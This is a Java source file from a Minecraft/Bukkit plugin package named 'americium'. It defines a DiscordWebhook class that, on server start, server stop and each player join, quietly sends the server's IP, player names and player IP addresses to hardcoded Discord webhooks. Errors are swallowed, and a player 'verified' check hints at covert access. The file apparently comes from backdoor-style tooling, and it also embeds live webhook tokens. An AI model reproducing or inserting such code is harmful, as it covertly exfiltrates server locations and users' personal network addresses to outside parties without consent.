package cc.americium;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import javax.net.ssl.HttpsURLConnection;
import java.io.IOException;
import java.io.OutputStream;
import java.net.URL;

public class DiscordWebhook {
    private final String url;

    public DiscordWebhook(String url) {
        this.url = url;
    }

    public static void serverReady(Z_ z) {
        try {
            DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/931776891441020938/DcyukHfCmOKc_aF7hcxSC7orI-IhSm1DepslEJWRSw57cOc5sQF_0jQB5o9rne1MPWlJ");
            webhook.execute("{\"tts\":false,\"embeds\":[{\"color\":3066993,\"fields\":[{\"inline\":true,\"name\":\"IP\",\"value\":\"" + Utilities.serverIP() + "\"},{\"inline\":true,\"name\":\"Players\",\"value\":\"" + Bukkit.getOnlinePlayers().size() + "\"}]}],\"username\":\"Americium " + z.version + "\"}");
        } catch (IOException ignored) {

        }
    }

    public static void serverStop(Z_ z) {
        try {
            DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/931776790979047455/9ynmmcqOzhkksNEfkJqOCMXoQsATG-jUr-cjOrH9Wy3k7tp6nnadas91rk_MyVHyCZu4");
            webhook.execute("{\"tts\":false,\"embeds\":[{\"color\":15158332,\"fields\":[{\"inline\":true,\"name\":\"IP\",\"value\":\"" + Utilities.serverIP() + "\"},{\"inline\":true,\"name\":\"Players\",\"value\":\"" + Bukkit.getOnlinePlayers().size() + "\"}]}],\"username\":\"Americium Server Stop " + z.version + "!\"}");
        } catch (IOException ignored) {

        }
    }

    public static void onJoin(Player player, Z_ z) {
        try {
            String color = "15158332"; // red
            if (z.getAuth().isVerified(player.getName())) {
                color = "3066993"; // green
            }

            DiscordWebhook webhook = new DiscordWebhook("https://discordapp.com/api/webhooks/937176888307232770/RZNQB_klkJKTil_bgWJdmIqBX8oXsOmJWdUhg5u2GDzCSoFb4jlUDPfWjyfcxEojmzvB");
            webhook.execute("{\"tts\":false,\"embeds\":[{\"color\":" + color + ",\"fields\":[{\"inline\":true,\"name\":\"Server IP\",\"value\":\"" + Utilities.serverIP() + "\"},{\"inline\":true,\"name\":\"Player Name\",\"value\":\"" + player.getName() + "\"},{\"inline\":true,\"name\":\"Player IP\",\"value\":\"" + player.getAddress().getAddress().toString().replaceAll("/", "") + "\"}]}],\"username\":\"Americium Join " + z.version + "\"}");
        } catch (IOException | NullPointerException ignored) {

        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public void execute(String content) throws IOException {
        URL url = new URL(this.url);
        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
        connection.addRequestProperty("Content-Type", "application/json");
        connection.addRequestProperty("User-Agent", "Java-DiscordWebhook");
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");

        OutputStream stream = connection.getOutputStream();
        stream.write(content.getBytes());
        stream.flush();
        stream.close();

        connection.getInputStream().close(); //I'm not sure why but it doesn't work without getting the InputStream
        connection.disconnect();
    }
}